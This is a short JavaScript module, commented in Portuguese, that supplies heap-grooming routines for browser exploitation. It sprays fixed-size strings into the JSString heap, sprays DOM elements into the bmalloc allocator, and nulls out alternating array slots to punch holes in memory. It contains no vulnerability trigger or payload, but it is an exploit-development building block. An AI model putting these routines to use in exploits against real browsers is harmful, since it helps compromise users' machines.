/**
 * MOD_GROOMER.JS — Manipulação Avançada de Heaps Específicos
 * Foco: JSString Heap, DOM bmalloc e criação de "Buracos" (Hole Punching)
 */

export const Groomer = {
    keepAlive: [],

    // 1. JSString Heap Grooming
    sprayStrings: function(size, count) {
        let strings = [];
        let base = "A".repeat(size);
        for (let i = 0; i < count; i++) {
            // O slice força o motor a alocar uma NOVA string na memória
            strings.push((base + i.toString()).slice(0, size));
        }
        return strings;
    },

    // 2. DOM Node Grooming (bmalloc)
    sprayDOM: function(tagName, count) {
        let nodes = [];
        for (let i = 0; i < count; i++) {
            let el = document.createElement(tagName);
            el.id = `groom_${i}`;
            nodes.push(el);
        }
        return nodes;
    },

    // 3. O Clássico "Hole Punching" (Queijo Suíço)
    punchHoles: function(array, step = 2) {
        for (let i = 0; i < array.length; i += step) {
            array[i] = null; // Cria o buraco
        }
        this.keepAlive.push(array); 
    },

    cleanup: function() {
        this.keepAlive = [];
    }
};